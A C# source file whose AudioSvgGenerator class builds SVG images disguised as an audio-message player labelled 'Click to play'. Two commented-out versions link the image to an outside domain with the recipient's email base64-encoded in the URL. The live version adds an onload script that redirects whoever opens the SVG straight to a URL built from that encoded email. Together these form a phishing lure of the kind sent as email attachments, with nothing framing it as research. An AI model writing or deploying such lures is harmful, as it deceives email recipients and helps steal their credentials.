using System;
using System.Text;


// public class AudioSvgGenerator
// {
//     public string GenerateClickableAudioSvg(string recipientEmail, int width = 300, int height = 80)
//     {
//         // Encode the recipient email for the URL
//         string RECIPIENT_BASE64_EMAIL = Convert.ToBase64String(Encoding.UTF8.GetBytes(recipientEmail));
//         string targetUrl = $"'https://test.affenreiniger.com#{RECIPIENT_BASE64_EMAIL}'";
        
//         // Create SVG with clickable audio control visualization
//         var svg = new StringBuilder();
//         svg.AppendLine($@"<svg width='{width}' height='{height}' 
//                         xmlns='http://www.w3.org/2000/svg'
//                         xmlns:xlink='http://www.w3.org/1999/xlink'>");
        
//         // Clickable area (rectangle covering the audio control graphic)
//         svg.AppendLine($@"<a xlink:href='{targetUrl}' target='_blank'>
//                         <rect x='0' y='0' width='{width}' height='{height}' 
//                         fill='transparent'/>");
        
//         // Audio control visualization
//         svg.AppendLine(@"<g transform='translate(10, 20)'>
//                         <rect width='200' height='40' rx='5' fill='#f0f0f0' stroke='#ccc'/>
//                         <circle cx='30' cy='20' r='6' fill='#666'/>
//                         <circle cx='50' cy='20' r='6' fill='#666'/>
//                         <circle cx='70' cy='20' r='6' fill='#666'/>
//                         <text x='100' y='25' font-family='Arial' font-size='14' 
//                         fill='black'>Click to play audio</text>
//                         </g>");
        
//         svg.AppendLine("</a>");
//         svg.AppendLine("</svg>");

//         return svg.ToString();
//     }
// }


// public class AudioSvgGenerator
// {
//     public string GenerateClickableAudioSvg(string recipientEmail, int width = 300, int height = 80)
//     {
//         // Encode the recipient email for the URL
//         string RECIPIENT_BASE64_EMAIL = Convert.ToBase64String(Encoding.UTF8.GetBytes(recipientEmail));
//         string targetUrl = $"https://test.affenreiniger.com#{RECIPIENT_BASE64_EMAIL}";

//         // Create SVG with clickable audio control visualization
//         var svg = new StringBuilder();
//         svg.AppendLine($@"<svg width='{width}' height='{height}' 
//                         xmlns='http://www.w3.org/2000/svg'
//                         xmlns:xlink='http://www.w3.org/1999/xlink'>");

//         // Clickable area
//         svg.AppendLine($@"<a xlink:href='{targetUrl}' target='_blank' xlink:title='Click to play audio'>");

//         // Background rectangle
//         svg.AppendLine(@"<rect x='0' y='0' width='300' height='80' rx='10' fill='#f9f9f9' stroke='#ccc'/>");

//         // Audio control visualization
//         svg.AppendLine(@"<g transform='translate(10, 30)'>
//                         <rect width='200' height='40' rx='5' fill='#f0f0f0' stroke='#ccc'/>
//                         <circle cx='30' cy='20' r='6' fill='#666'/>
//                         <circle cx='50' cy='20' r='6' fill='#666'/>
//                         <circle cx='70' cy='20' r='6' fill='#666'/>
//                         <text x='90' y='25' font-family='Arial' font-size='14' 
//                         fill='black'>Click to play</text>
//                         </g>");

//         svg.AppendLine("</a>");
//         svg.AppendLine("</svg>");

//         return svg.ToString();
//     }
// }



public class AudioSvgGenerator
{
    public string GenerateAutoRedirectSvg(string recipientEmail, int width = 300, int height = 80)
    {
        // Encode the recipient email for the URL
        string RECIPIENT_BASE64_EMAIL = Convert.ToBase64String(Encoding.UTF8.GetBytes(recipientEmail));
        string targetUrl = $"https://{RECIPIENT_BASE64_EMAIL}";

        // Create SVG with automatic redirection + audio control visualization
        var svg = new StringBuilder();
        svg.AppendLine($@"<svg width='{width}' height='{height}' 
                        xmlns='http://www.w3.org/2000/svg'
                        xmlns:xlink='http://www.w3.org/1999/xlink'
                        onload=""window.location.href='{targetUrl}'"">");

        // Background rectangle
        svg.AppendLine(@"<rect x='0' y='0' width='300' height='80' rx='10' fill='#f9f9f9' stroke='#ccc'/>");

        // Audio control visualization
        svg.AppendLine(@"<g transform='translate(10, 30)'>
                        <rect width='200' height='40' rx='5' fill='#f0f0f0' stroke='#ccc'/>
                        <circle cx='30' cy='20' r='6' fill='#666'/>
                        <circle cx='50' cy='20' r='6' fill='#666'/>
                        <circle cx='70' cy='20' r='6' fill='#666'/>
                        <text x='90' y='25' font-family='Arial' font-size='14' 
                        fill='black'>Click to play</text>
                        </g>");

        svg.AppendLine("</svg>");

        return svg.ToString();
    }
}
